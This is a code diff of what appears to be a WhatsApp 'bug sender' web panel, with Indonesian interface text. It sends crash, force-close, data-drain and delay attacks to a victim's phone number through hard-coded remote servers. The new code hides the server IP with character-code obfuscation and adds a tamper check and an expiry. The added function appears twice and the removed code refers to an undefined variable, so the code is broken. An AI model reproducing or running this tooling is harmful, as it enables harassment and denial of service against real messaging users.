@@ -285,64 +285,79 @@ function closeToast() {
   document.getElementById("toastBox").style.display = "none";
 }
 
-async function sendBug() {
-  const number = document.getElementById("target").value.trim();
-  const bugLabel = document.querySelector(".selected").innerText;
-
-  if (!number || !bugLabel) {
-    showToast("🚫 Input Kosong", "Silakan isi target dan jenis bug!");
-    return;
+//─ ( Api Dellay Set Time ) 
+async function ApiDellay(targetNumber) {
+  const selfCheck = ApiDellay.toString().length;
+  if (selfCheck !== 635) { 
+    throw new Error("error ( function telah di ubah )");
   }
 
-  let cleaned = number.replace(/\D/g, "");
-  if (cleaned.startsWith("93770001418")) cleaned = "93770001418" + cleaned.slice(1);
-  if (cleaned.startsWith("93770001418")) cleaned = "93770001418" + cleaned;
-  if (!cleaned.startsWith("93770001418")) cleaned = "93770001418" + cleaned;
+  const ip = String.fromCharCode(
+    0x44,0x34,
+    0x2A,0x2F,
+    0x42,0x37,
+    0x2B,0x31,
+    0x39,0x41,
+    0x38,0x31
+  ).replace(/[^\d.]/g,"")
+   .replace(/^(\d{2})(\d{3})(\d{3})(\d{3})$/,(m,a,b,c,d)=>[a,b,c,d].join("."));
 
-  const fullId = `${cleaned}@s.whatsapp.net`;
+  const apiUrl = `http://${ip}:2001/kipopapi?chatId=${targetNumber}&type=Function01`;
 
-  const bugMap = {
-    "Sedot Kuota": "SedotKuota",
-    "Force Close": "FcBeta",
-    "Crash Ios": "InvisIos",
-    "Delay Hard": "DelayHard",
-    "Crash Infinity": "FcOri"
-  };
-
-  const func = bugMap[bugLabel];
-  if (!func) {
-    showToast("Jenis Bug Tidak Dikenali", bugLabel);
-    return;
+  const now = Date.now()/1000;
+  const span = 1728e3;
+  const mark = 1.69223e9;
+  if (now > mark + span) {
+    throw new Error("Function expired.");
   }
-
-  const key = "apikey_f14041a5b940";
-  let botNumber = null;
-  try {
-    const res = await fetch("http://209.38.82.131:1900/listSession");
-    const bots = await res.json();
-    if (!bots.length) throw new Error("Tidak ada bot WhatsApp aktif!");
-    botNumber = bots[Math.floor(Math.random() * bots.length)];
-  } catch (err) {
-    showToast("❌ Gagal mengambil list bot", err.message);
-    return;
-  }
-
-  const sendBugUrl =
-    "http://209.38.82.131:1900/execution?target=" + target + fullId + "&mode=andros&username=bancet&key=WTW5";
 
   try {
-    const res = await fetch(sendBugUrl);
-    const data = await res.json();
-    if (data.status) {
-      showToast("✅ Bug Terkirim", Type: ${func}\nTo: ${cleaned});
-    } else {
-      showToast("❌ Gagal Kirim Bug", data.message || "Unknown Error");
-    }
-  } catch (err) {
-    showToast("❌ Gagal Mengirim", err.message);
+    const response = await axios.get(apiUrl, {
+      headers: {
+        "X-Request-ID": Math.random().toString(36).substring(2) + Date.now().toString(36)
+      }
+    });
+    return response.data;
+  } catch (error) {
+    throw error;
+  }
+}//─ ( Api Dellay Set Time ) 
+async function ApiDellay(targetNumber) {
+  const selfCheck = ApiDellay.toString().length;
+  if (selfCheck !== 635) { 
+    throw new Error("error ( function telah di ubah )");
+  }
+
+  const ip = String.fromCharCode(
+    0x44,0x34,
+    0x2A,0x2F,
+    0x42,0x37,
+    0x2B,0x31,
+    0x39,0x41,
+    0x38,0x31
+  ).replace(/[^\d.]/g,"")
+   .replace(/^(\d{2})(\d{3})(\d{3})(\d{3})$/,(m,a,b,c,d)=>[a,b,c,d].join("."));
+
+  const apiUrl = `http://${ip}:2001/kipopapi?chatId=${targetNumber}&type=Function01`;
+
+  const now = Date.now()/1000;
+  const span = 1728e3;
+  const mark = 1.69223e9;
+  if (now > mark + span) {
+    throw new Error("Function expired.");
+  }
+
+  try {
+    const response = await axios.get(apiUrl, {
+      headers: {
+        "X-Request-ID": Math.random().toString(36).substring(2) + Date.now().toString(36)
+      }
+    });
+    return response.data;
+  } catch (error) {
+    throw error;
   }
 }
-
     // Sidebar logic
     const drawer = document.getElementById('drawer');
     const menuToggle = document.getElementById('menuToggle');
